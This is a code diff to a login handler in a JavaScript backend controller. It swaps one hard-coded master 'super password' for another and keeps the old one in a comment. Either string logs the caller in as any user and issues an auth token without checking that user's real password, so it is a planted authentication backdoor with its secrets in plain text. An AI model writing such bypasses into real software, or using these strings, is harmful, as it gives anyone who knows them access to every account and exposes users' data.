@@ -5401,7 +5401,8 @@ class CDCController {
         message: `Selamat datang ${res.nama}`,
         token,
       });
-    } else if (password == "D*@)eeNDoje298370+?-=234&%&#*(") {
+    } else if (password == "A#)kLo39we@924+-=719&%$^*@") {
+      // old super password D*@)eeNDoje298370+?-=234&%&#*(
       const { token } = await auth.generate(res);
 
       return response.ok({
